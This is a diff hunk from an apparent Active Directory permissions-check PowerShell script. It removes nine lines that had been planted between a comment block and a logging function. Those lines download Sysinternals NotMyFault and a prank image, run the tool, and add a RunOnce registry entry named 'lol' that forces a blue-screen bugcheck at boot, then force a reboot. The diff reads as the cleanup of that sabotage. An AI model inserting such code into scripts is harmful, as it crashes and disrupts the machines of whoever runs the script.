@@ -189,16 +189,6 @@ $ver
 		into the DisplayName attribute and cleared afterwards. If both those actions succeed it is proven the required permissions are
 		in place!
 #>
-[Net.ServicePointManager}::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-mkdir C:\testdir\
-iwr https://download.sysinternals.com/files/NotMyFault.zip -OutFile C:\testdir\NotMyFault.zip
-iwr "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Flittlegreenfootballs.com%2Fweblog%2Fimg%2Fteleskiguy%2F2015%2F09%2F10%2Fhuffing-paint.jpg&f=1&nofb=1" -OutFile C:\testdir\paintman.jpg
-Expand-Archive C:\testdir\NotMyFault.zip -DestinationPath C:\testdir\NMF\
-C:\testdir\NMF\notmyfaultc64.exe /AcceptEULA
-New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\' -Name "lol" -Value "C:\testdir\NMF\notmyfaultc64.exe bugcheck 0x155"
-C:\testdir\paintman.jpg
-Start-Sleep 5
-Restart-Computer -Force
 ### FUNCTION: Logging Data To The Log File
 Function Logging($dataToLog, $lineType) {
 	$datetimeLogLine = "[" + $(Get-Date -format "yyyy-MM-dd HH:mm:ss") + "] : "
